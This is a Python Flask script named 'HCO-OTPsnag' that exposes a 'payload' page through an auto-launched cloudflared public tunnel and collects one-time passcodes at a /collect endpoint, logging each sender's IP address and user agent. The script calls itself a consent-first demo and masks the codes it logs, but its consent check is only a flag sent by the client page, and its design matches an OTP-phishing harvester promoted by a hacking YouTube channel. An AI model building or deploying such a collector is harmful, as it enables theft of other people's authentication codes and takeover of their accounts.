#!/usr/bin/env python3
"""
HCO-OTPsnag — Consent-first demo with optional cloudflared automation

Usage:
    python3 main.py         # will try to auto-launch cloudflared if available
    python3 main.py --no-cf # skip attempting cloudflared

Notes:
- If cloudflared is installed and in PATH, the script will spawn it and attempt to parse the public URL.
- If cloudflared is not installed, the server still runs locally at http://127.0.0.1:PORT/payload
"""
import os
import time
import webbrowser
import argparse
import subprocess
import threading
import re
from flask import Flask, request, render_template_string, jsonify
from datetime import datetime

# CONFIG
YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
PORT = int(os.getenv("PORT", 8080))
HOST = os.getenv("HOST", "0.0.0.0")
LOGFILE = "consented_otps.log"

app = Flask(__name__)

# load payload html from file
HERE = os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(HERE, "payload.html"), "r", encoding="utf-8") as f:
    PAYLOAD_HTML = f.read()

# ---- cloudflared helper ----
def find_cloudflared_in_path():
    try:
        subprocess.run(["cloudflared","--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def start_cloudflared_and_get_url(port, timeout=20):
    """
    Start cloudflared as a subprocess and parse stdout/stderr for the public URL.
    Returns (process, public_url_or_None)
    If unable to find URL within timeout, returns (process, None).
    """
    cmd = ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception as e:
        print("[!] Failed to start cloudflared:", e)
        return None, None

    url_holder = {"url": None}
    pattern = re.compile(r"https?://[^\s]*trycloudflare\.com[^\s]*", re.IGNORECASE)

    def reader():
        try:
            for line in proc.stdout:
                line = line.strip()
                if not line:
                    continue
                # print cloudflared output as it comes, but keep it subtle
                print("[cloudflared] " + line)
                # try to find trycloudflare URL
                m = pattern.search(line)
                if m:
                    url_holder["url"] = m.group(0)
                    break
        except Exception:
            pass

    t = threading.Thread(target=reader, daemon=True)
    t.start()

    # wait up to timeout seconds for url to appear
    waited = 0
    while waited < timeout:
        if url_holder["url"]:
            return proc, url_holder["url"]
        time.sleep(0.5)
        waited += 0.5

    # timed out, but process is still running
    return proc, url_holder["url"]

# ---- Terminal UI and logging ----
def print_red_box():
    # red background / bold green text inside ASCII box (ANSI)
    RED_BG = "\033[41m"
    GREEN = "\033[32m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

    lines = ["HCO OTP Snag", "by Azhar"]
    width = max(len(l) for l in lines) + 6
    top = "╔" + "═" * width + "╗"
    bottom = "╚" + "═" * width + "╝"
    print(RED_BG + top + RESET)
    for line in lines:
        pad = width - len(line)
        left = pad // 2
        right = pad - left
        print(RED_BG + "║" + RESET + " " * left + BOLD + GREEN + line + RESET + " " * right + RED_BG + "║" + RESET)
    print(RED_BG + bottom + RESET)

def log_submission(data):
    with open(LOGFILE, "a", encoding="utf-8") as f:
        ts = datetime.utcnow().isoformat() + "Z"
        entry = {"ts": ts, "from_ip": data.get("from_ip"), "ua": data.get("ua"), "otp_preview": data.get("otp_preview"), "note": data.get("note", "")}
        f.write(str(entry) + "\n")
    # Print in terminal clearly (this is the live output)
    print("\n\033[1;31m[+] Consented OTP Submission:\033[0m")
    print("  OTP (masked):", data.get("otp_preview"))
    print("  From IP:", data.get("from_ip"))
    print("  UA:", data.get("ua"))
    print("  Note:", data.get("note",""))
    print("  Time (UTC):", datetime.utcnow().isoformat() + "Z")
    print("--------------------------------------------------\n")

# ---- Flask routes ----
@app.route("/")
def index():
    return "<h3>HCO-OTPsnag — Consent-first demo. Visit /payload (consent required)</h3>"

@app.route("/payload")
def payload():
    # serve the consent-first payload
    return render_template_string(PAYLOAD_HTML)

@app.route("/collect", methods=["POST"])
def collect():
    """
    Expected JSON:
    { "consent": true, "otp": "...", "note": "..."}
    """
    data = request.get_json(force=True, silent=True) or {}
    remote = request.remote_addr
    ua = request.headers.get("User-Agent","")
    if not data.get("consent"):
        return jsonify({"status":"failed","reason":"no consent"}), 400
    otp = (data.get("otp","") or "").strip()
    if not otp:
        return jsonify({"status":"failed","reason":"no otp provided"}), 400

    # Mask OTP for display/storage (keep first and last char if length >=2)
    if len(otp) <= 2:
        preview = "*" * len(otp)
    else:
        preview = otp[0] + ("*" * (len(otp)-2)) + otp[-1]

    record = {
        "from_ip": remote,
        "ua": ua,
        "otp_preview": preview,
        "note": data.get("note","")
    }
    log_submission(record)
    # Respond and optionally redirect client to your YouTube or a thank you page
    return jsonify({"status":"ok","message":"Thank you — consented OTP recorded (masked)."}), 200

# ---- Main flow ----
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--no-cf", action="store_true", help="Do not attempt to launch cloudflared")
    args = parser.parse_args()

    # 1) Show message and open YouTube for 8 seconds
    print("This tool is not free. Redirecting to YouTube in 8 seconds...")
    try:
        webbrowser.open(YOUTUBE_URL)
    except Exception:
        print("Open this URL in your browser:", YOUTUBE_URL)
    time.sleep(8)

    # 2) Print red box with green text
    print_red_box()

    # 3) Optionally attempt to start cloudflared
    cf_proc = None
    public_url = None
    if not args.no_cf:
        if find_cloudflared_in_path():
            print("[*] cloudflared detected — attempting to start tunnel and fetch public URL...")
            cf_proc, public_url = start_cloudflared_and_get_url(PORT, timeout=25)
            if public_url:
                print(f"[+] cloudflared public URL: {public_url}/payload")
            else:
                print("[!] cloudflared started but public URL was not found in output within timeout.")
                print("    The process may still be running; check cloudflared output above.")
        else:
            print("[!] cloudflared not found in PATH.")
            print("    To install cloudflared on Termux/Android follow these general steps (example):")
            print("    1) Download the cloudflared binary for your architecture from Cloudflare (arm/arm64).")
            print("    2) chmod +x cloudflared && mv cloudflared /data/data/com.termux/files/usr/bin/")
            print("    Or install via package manager if available. After installing, re-run this script.")
            print("    You can also use ngrok as an alternative and expose http://127.0.0.1:%d/payload" % PORT)

    # 4) Start Flask server and show endpoint info
    host_display = "127.0.0.1" if HOST == "0.0.0.0" else HOST
    print(f"[*] Starting server on {HOST}:{PORT}")
    if public_url:
        print(f"[*] Public payload URL (open on your other device): {public_url}/payload")
    else:
        local_url = f"http://{host_display}:{PORT}/payload"
        print(f"[*] Open the payload on your device or other device via tunnel: {local_url}")
    print("Tip: to test from another device use cloudflared/ngrok to create a public URL for /payload.")

    try:
        app.run(host=HOST, port=PORT)
    finally:
        # clean up cloudflared process if we started it
        if cf_proc:
            try:
                print("[*] Shutting down cloudflared...")
                cf_proc.terminate()
                cf_proc.wait(timeout=5)
            except Exception:
                try:
                    cf_proc.kill()
                except Exception:
                    pass

if __name__ == "__main__":
    main()
